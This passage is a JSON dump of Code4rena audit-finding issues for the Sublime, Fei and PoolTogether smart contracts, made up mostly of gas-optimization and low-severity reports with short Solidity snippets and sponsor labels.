"https://github.com/code-423n4/2021-12-sublime-findings/issues/48", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Natspec not matching function's logic"}, {"title": "Reduce length of require error messages to save in deployment costs", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0xngndev   # Vulnerability details  ### Impact  Some of your contracts are quite large byte-wise and require the optimizer with low runs to not reach the code size limit of 24576 bytes. The code size of these contracts can be drastically reduced by shortening the length of your error messages, reducing their deployment cost.  The best example of contracts having unnecessary long erorr messages are `CreditLine.sol` and `PoolFactory.sol`. When it comes to factories, whose primary goal is to deploy contracts, reducing the cost  of doing so is something to keep in mind.  ### Mitigation Steps  Reduce the length of your error strings. Error messages like:  `'PoolFactory::createPool - Repayment interval not within limits'`  Could be reduced to:  `Interval out of limits`  You could save even more by doing something similar to what Uniswap does. They have very short error messages like: `ST`, and they expand on what they mean in their documentation.  Another approach is to use revert with CustomErrors, something like this:  `if (....) revert CustomError()`  Following the example I used above, you could have a custom error message that says:  `OutOfBounds()` and expand what it means in the natspec.  Custom error messages are cheaper than strings error messages. Here's a snippet of Solidity's documentation about this:  > Using a\u00a0**custom**\u00a0**error**\u00a0instance will usually be much cheaper than a string description, because you can use the name of the error to describe it, which is encoded in only four bytes. A longer description can be supplied via NatSpec which does not incur any costs. >  "}, {"title": "Fix Unused Variables and Function Parameters", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/46", "labels": ["bug", "disagree with severity", "G (Gas Optimization)"], "target": "2021-12-sublime-findings", "body": "Fix Unused Variables and Function Parameters"}, {"title": "AaveYield: Misspelled external function name making functions fail", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/42", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  In `AaveYield.sol` the functions:  - `liquidityToken` - `_withdrawETH` - `_depositETH`  Make a conditional call to `IWETHGateway(wethGateway).getAWETHAddress()`  This function does not exist in the `wethGateway` contract, causing these function to fail with the error `\"Fallback not allowed\"`.  The function they should be calling is `getWethAddress()` without the \"A\".  Small yet dangerous typo.  ### Mitigation Steps  Simply modify:   `IWETHGateway(wethGateway).getAWETHAddress()`  to:  `IWETHGateway(wethGateway).getWETHAddress()`  In the functions mentioned above.  "}, {"title": "Possibility to drain SavingsAccount contract assets", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/41", "labels": ["bug", "3 (High Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Possibility to drain SavingsAccount contract assets"}, {"title": "Gas: Inlining logic that's used only once in the contract", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/40", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0xngndev   # Vulnerability details  ### Impact  Reduce code size and gas expenditure by inlining internal functions that are only used once throughout your contract.  In some of your contracts, like `AaveYield.sol`, you have an `initialize` function that calls the internal functions `updateSavingsAccount` and `updateAaveAddresses`. These two functions are only called in the `initialize` function, so you can save some gas and code size by simply inlining their logic inside `initialize`. **The tradeoff, of course, is that you lose readability, and because `initialize` will only be called once, perhaps it's not worth the tradeoff.**  To test the difference in code size and gas expenditure I wrote a example contract replicating the behaviour to see how much cheaper inlining the logic was.  **The results:**  Inlining the logic:  - Gas spent: 45155 - Code size: 453 bytes  Separating into internal functions:  - Gas spent: 45189 - Code size: 467 bytes  ### Proof of Concept  Contracts I used to test the gas expenditure and code size differences:  - InliningLogic  ```bash //SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.10;  contract InliningLogic {   address public someRandomAddress;   address public anotherRandomAddress;    function assignAddresses(     address _someRandomAddress,     address _anotherRandomAddress   ) public {     someRandomAddress = _someRandomAddress;     anotherRandomAddress = _anotherRandomAddress;   } } ```  - InliningLogic.t \u2014> DappTools test file  ```bash //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  import \"ds-test/test.sol\"; import \"../InliningLogic.sol\";  contract InliningLogicTest is DSTest {   InliningLogic inliningLogicContract;    function setUp() public {     inliningLogicContract = new InliningLogic();   }    function testInliningLogic() public logs_gas {     inliningLogicContract.assignAddresses(address(0x1), address(0x1));   } } ```  - NotInliningLogic  ```bash //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  contract NotInliningLogic {   address public someRandomAddress;   address public anotherRandomAddress;    function assignAddresses(     address _someRandomAddress,     address _anotherRandomAddress   ) public {     _assignAddresses(_someRandomAddress, _anotherRandomAddress);   }    function _assignAddresses(     address _someRandomAddress,     address _anotherRandomAddress   ) internal {     someRandomAddress = _someRandomAddress;     anotherRandomAddress = _anotherRandomAddress;   } } ```  - NotInliningLogic.t \u2014> test file  ```bash //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  import \"ds-test/test.sol\"; import \"../NotInliningLogic.sol\";  contract NotInliningLogicTest is DSTest {   NotInliningLogic notInliningLogicContract;    function setUp() public {     notInliningLogicContract = new NotInliningLogic();   }    function testNotInliningLogic() public logs_gas {     notInliningLogicContract.assignAddresses(address(0x1), address(0x1));   } } ```  ### Tools  DappTools  "}, {"title": "Gas: Upgrading solc version and removing SafeMath", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Gas: Upgrading solc version and removing SafeMath"}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/38", "labels": ["bug", "0 (Non-critical)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "# Handle  robee   # Vulnerability details  Users can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing. Furthermore, removing either the actual return or the named return will save gas.           L1LPTGateway.sol, getOutboundCalldata         L2LPTGateway.sol, outboundTransfer         L2LPTGateway.sol, getOutboundCalldata  "}, {"title": "Unnecessary uint zero initialization", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  uint256 variable are initialized to a default value of zero per Solidity docs: https://docs.soliditylang.org/en/latest/control-structures.html#default-value   Setting a variable to the default value is unnecessary. Removing lines of code where variables are initialized to zero can save gas. Here are a few articles describing this gas optimization: https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#53bd  https://medium.com/coinmonks/gas-optimization-in-solidity-part-i-variables-9d5775e43dde#4135   ## Proof of Concept  - contracts/Pool/Pool.sol:358 https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L358  - contracts/CreditLine/CreditLine.sol:812 https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L812   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Instead of initializing a variable to zero, such as `uint256 abc = 0;`, the line can be shortened to `uint256 abc;` as Solidity automatically initializes uint variables to zero.  "}, {"title": "Gas optimization", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept The method initializeRepayment inside the contract Repayments has multipe storage access, it's better to get a pointer of the `RepaymentConstants` with the `storage` keyword in order to avoid seeking and storage access.  ## Tools Used Manual review  ## Recommended Mitigation Steps Use storage keyword in order to save gas  "}, {"title": "Not verified function inputs of public / external functions", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/30", "labels": ["bug", "duplicate", "0 (Non-critical)"], "target": "2021-12-sublime-findings", "body": "Not verified function inputs of public / external functions"}, {"title": "Lack Of Precision", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/26", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Lack Of Precision"}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/22", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  robee   # Vulnerability details  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:           change to prefix increment and unchecked: ConvexStakingWrapper.sol, i, 115         change to prefix increment and unchecked: ConvexStakingWrapper.sol, u, 172         change to prefix increment and unchecked: ConvexStakingWrapper.sol, u, 227         change to prefix increment and unchecked: ConvexYieldWrapper.sol, i, 111         change to prefix increment and unchecked: ConvexStakingWrapper.sol, i, 287         change to prefix increment and unchecked: ConvexStakingWrapper.sol, i, 271         change to prefix increment and unchecked: ConvexStakingWrapper.sol, i, 315         change to prefix increment and unchecked: ConvexYieldWrapper.sol, i, 63  "}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/21", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2021-12-sublime-findings", "body": "Unnecessary array boundaries check when loading an array element twice"}, {"title": "Unnecessary Reentrancy Guards", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Unnecessary Reentrancy Guards"}, {"title": "Gas saving by struct reorganization", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept  It's possible to optimize the struct CreditLineConstants from CreditLine contract, the last 4 fields spend 3 storage slots, moving the boolean values between the address values, it will spend only two slots as follows:  ```struct CreditLineConstants {         address lender;         address borrower;         uint256 borrowLimit;         uint256 idealCollateralRatio;         uint256 borrowRate;         address borrowAsset;         bool autoLiquidation;         address collateralAsset;         bool requestByLender;     }```.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Reorder the structs fields  "}, {"title": "Gas saving using delete", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept In the method updateStrategy and removeStrategy of StrategyRegistry contract, when the contract want to remove a strategy, the old one, it's set to false, instead of use delete, this will remaing the storage space and it has expensive than use delete.  ## Tools Used Manual review  ## Recommended Mitigation Steps Use delete instead of set to `false`  "}, {"title": "Gas saving removing safe math", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept The method addStrategy inside StrategyRegistry do a require with safe math: `require(strategies.length.add(1) <= maxStrategies, \"StrategyRegistry::addStrategy - Can't add more strategies\");` is not possible to has a map that could lead in an integer overflow, so remove this `add` and use a regular +  will safe gas.  ## Tools Used Manual review  ## Recommended Mitigation Steps Remove safe math in this call  "}, {"title": "Gas saving by duplicate check", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept In the contract `StrategyRegistry` the method `initialize` execute a require in order to check that the `_maxStrategies` is different than 0, this check will be done later inside the method `_updateMaxStrategies`, so it's duplicated and can be removed.  ## Tools Used Manual review  ## Recommended Mitigation Steps Remove the _maxStrategies checks inside the initialize method.  "}, {"title": "Deprecated safeApprove() function", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/2", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  sirhashalot   # Vulnerability details  The OpenZeppelin ERC20 `safeApprove()` function has been deprecated, as seen in the comments of the OpenZeppelin code.  ## Impact Detailed description of the impact of this finding.  Using this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ [issue #2219](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219).  ## Proof of Concept  The deprecated function is found in: - SavingsAccount/SavingsAccount.sol [line 173](https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/SavingsAccount/SavingsAccount.sol#L173) - SavingsAccount/SavingsAccountUtil.sol [line 61](https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/SavingsAccount/SavingsAccountUtil.sol#L61) - mocks/yVault/yVault.sol [line 164](https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/mocks/yVault/yVault.sol#L164) - mocks/yVault/Controller.sol [line 196 and 197](https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/mocks/yVault/Controller.sol#L196)   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  As suggested by the OpenZeppelin comment, replace `safeApprove()` with `safeIncreaseAllowance()` or `safeDecreaseAllowance()` instead.  "}, {"title": "Comparison with literal boolean values", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/160", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Comparison with literal boolean values"}, {"title": "Unused local variables in requery (TRIBERagequit.sol)", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Unused local variables in requery (TRIBERagequit.sol)"}, {"title": "Assignment Of State Variables To Default ", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Assignment Of State Variables To Default "}, {"title": "unsafe cast", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/151", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  danb   # Vulnerability details  oracle.pcvStats returns newProtocolEquity as  int256, it is then casted to uint256 in recalculate. If it is possible that newProtocolEquity will be negative, consider using SafeCast instead.  "}, {"title": "denial of service", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/150", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "denial of service"}, {"title": "PegExchanger expiry block must be set to at least `MIN_EXPIRY_WINDOW + 1` into the future", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/149", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "PegExchanger expiry block must be set to at least `MIN_EXPIRY_WINDOW + 1` into the future"}, {"title": "`preMergeCirculatingTribe` can be constant", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  loop   # Vulnerability details  `preMergeCirculatingTribe` is a `uint256` set to a constant value which isn't changed by any function in the contract and can thus be declared as a constant state variable to save some gas during deployment and when using `preMergeCirculatingTribe`.  ## Proof of Concept https://github.com/code-423n4/2021-11-fei/blob/main/contracts/TRIBERagequit.sol#L28  "}, {"title": "No restriction for expiration block in TRIBERagequit.sol", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/144", "labels": ["bug", "duplicate", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "No restriction for expiration block in TRIBERagequit.sol"}, {"title": "Don't cache bool `check`", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/143", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-11-fei-findings", "body": "Don't cache bool `check`"}, {"title": "Not used return value at recalculate and requery in TRIBERagequit.sol", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/138", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-11-fei-findings", "body": "Not used return value at recalculate and requery in TRIBERagequit.sol"}, {"title": "Wrong comments about key in TRIBERagequit", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/135", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Wrong comments about key in TRIBERagequit"}, {"title": "Loops can be implemented more efficiently", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/134", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Loops can be implemented more efficiently"}, {"title": "In TRIBERagequit.sol, users can get frontrunned ", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/131", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "In TRIBERagequit.sol, users can get frontrunned "}, {"title": "Value of token1OutBase might became stale in TRIBERagequit.sol", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/126", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Value of token1OutBase might became stale in TRIBERagequit.sol"}, {"title": "Gas Optimization: Unchecked safe logic in TRIBERagequit.sol", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Gas Optimization: Unchecked safe logic in TRIBERagequit.sol"}, {"title": "Inaccurate revert reason in TRIBERagequit.sol", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/122", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact The revert reason in L74 is inaccurate. It should be \"ragequit more than assigned\". L72-75 ```         require(             (claimed[thisSender] + multiplier) <= key,             \"already ragequit all you tokens\"         ); ``` The original revert string wrongly implies that claimed[thisSender] >= key Might cause confusing when user who have not yet claimed mistakenly supplied a multiplier > key  "}, {"title": "Wrong `preMergeCirculatingTribe` value", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/112", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Wrong `preMergeCirculatingTribe` value"}, {"title": "TRIBERageQuit: Redundant oracleAddress variable", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/108", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ## Impact  The following line  ```jsx address public constant oracleAddress =  0xd1866289B4Bd22D453fFF676760961e0898EE9BF; // oracle with caching ```  is only used in the instantiation of the oracle  `IOracle public constant oracle = IOracle(oracleAddress);`  The first instantiation can be combined with the second to save gas.  ## Recommended Mitigation Steps  `IOracle public constant oracle = IOracle(0xd1866289B4Bd22D453fFF676760961e0898EE9BF);`  "}, {"title": "TRIBERagequit: Make verifyClaim() public", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/107", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ## Suggestion  Based on past experiences with on-chain actions involving merkle proofs, users tend to ask for the merkle tree data so that they can, in this case, ragequit their TRIBE for FEI by directly interacting with the contract on Etherscan.  It would therefore be helpful for `verifyClaim()` to be made public for users to verify that the merkle proof they input via Etherscan is correct.  "}, {"title": "PegExchanger#giveTo(): Use transfer() method instead of transferFrom()", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ## Impact  Looking at the TRIBE token implementation, it would be cheaper to call the `transfer()` method as opposed to the the `transferFrom()` method since the latter contains additional logic (Eg. additional SLOAD to fetch the allowance).  ## Recommended Mitigation Steps  ```jsx function giveTo(address target, uint256 amount) internal {   bool check = token1.transfer(target, amount);  require(check, \"erc20 transfer failed\"); } ```  "}, {"title": "Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "Use `calldata` instead of `memory` for function parameters"}, {"title": "Gas Optimization On The 2^256-1", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Gas Optimization On The 2^256-1"}, {"title": "Remove unnecessary variables can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/99", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Remove unnecessary variables can make the code simpler and save some gas"}, {"title": "`++i` is more efficient than `i++`", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "`++i` is more efficient than `i++`"}, {"title": " `TribeRagequit.sol` minter role to FEI is unnecessary", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": " `TribeRagequit.sol` minter role to FEI is unnecessary"}, {"title": "Remove unnecessary function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/88", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-11-fei-findings", "body": "Remove unnecessary function can make the code simpler and save some gas"}, {"title": "`PegExchanger.sol` unused tribe tokens can be frozen in the contract", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/87", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "`PegExchanger.sol` unused tribe tokens can be frozen in the contract"}, {"title": "Improve readability of constants", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/84", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-11-fei-findings", "body": "Improve readability of constants"}, {"title": "Consider change some constants into immutable variables for settings that can be configured at deploy time", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Consider change some constants into immutable variables for settings that can be configured at deploy time"}, {"title": "Code Style: constants should be named in all caps", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/79", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-11-fei-findings", "body": "Code Style: constants should be named in all caps"}, {"title": "Use short reason strings can save gas", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/78", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "Use short reason strings can save gas"}, {"title": "Use else if can save gas", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Use else if can save gas"}, {"title": "`PegExchanger.sol#exchange()` Redundant code", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "`PegExchanger.sol#exchange()` Redundant code"}, {"title": "Missing events for critical operations", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/68", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-11-fei-findings", "body": "Missing events for critical operations"}, {"title": "Outdated compiler version", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/66", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Outdated compiler version"}, {"title": "False information given to the user", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/64", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact In `TribeRagequit` when a user tries to withdraw more than is left, a `\"already ragequit all you tokens\"` error is displayed. This is not necessarily true.\\ For example, if one may withdraw multiplier 1000 times and calls `ngmi(...)` function, stating their balance as 1001 tokens, they would get an information that they have already ragequit all tokens, whic is false as non of them have been ragequit yet.  ## Proof of Concept [code](https://github.com/code-423n4/2021-11-fei/blob/add34324513b863f58e4ef7b3cd0c12d776dbb7f/contracts/TRIBERagequit.sol#L74)  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change the information to correctly reflect the situation.  "}, {"title": "Expiration time shift", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/61", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Expiration time shift"}, {"title": "Unnatural interface", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/57", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-11-fei-findings", "body": "Unnatural interface"}, {"title": "Ragequit function ngmi() Will Fail Even If Follow All Steps in Simulations", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/47", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Ragequit function ngmi() Will Fail Even If Follow All Steps in Simulations"}, {"title": "Avoid On Chain Computation That Have Known Answer to Save Gas", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/45", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Avoid On Chain Computation That Have Known Answer to Save Gas"}, {"title": "Open TODOs", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/31", "labels": ["bug", "0 (Non-critical)"], "target": "2021-11-fei-findings", "body": "Open TODOs"}, {"title": "Require with not comprehensive message", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/29", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "# Handle  robee   # Vulnerability details   The following requires has a non comprehensive messages.  This is very important to add a comprehensive message for any require. Such that the user has enough  information to know the reason of failure:           Solidity file: XDEFIDistribution.sol, In line 227 with Require message: NO_TOKEN         Solidity file: XDEFIDistribution.sol, In line 232 with Require message: NO_TOKEN    "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "Public functions to external"}, {"title": "Internal functions to private", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "Internal functions to private"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Gas saving in ngmi(uint256,uint256,bytes32[])", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-11-fei-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact Saving of one SLOAD instruction  ## Proof of Concept The value of `claimed[thisSender] + multiplier` is used twice in `ngmi(uint256,uint256,bytes32[])`. This involves a SLOAD each time it is calculated. Usages in lines 73 and 76 of TRIBERagequit.sol.  ## Tools Used Manual review  ## Recommended Mitigation Steps Precache the value of the expression right before line 72. Worst case, if the require fails, no extra gas is used. Best case, if the require succeeds, the SLOAD in line 76 is saved.  "}, {"title": "constructor should be removed if not used", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "constructor should be removed if not used"}, {"title": "Testing for initial condition on oracle query last saves gas.", "html_url": "https://github.com/code-423n4/2021-11-fei-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-11-fei-findings", "body": "Testing for initial condition on oracle query last saves gas."}, {"title": "Inline functions _updateClaimedEpoch and _isClaimedEpoch", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "Inline functions _updateClaimedEpoch and _isClaimedEpoch"}, {"title": "Transfer amounts not checked for > 0 ", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "Transfer amounts not checked for > 0 "}, {"title": "Implement _calculateRewardAmount more efficiently", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/134", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], 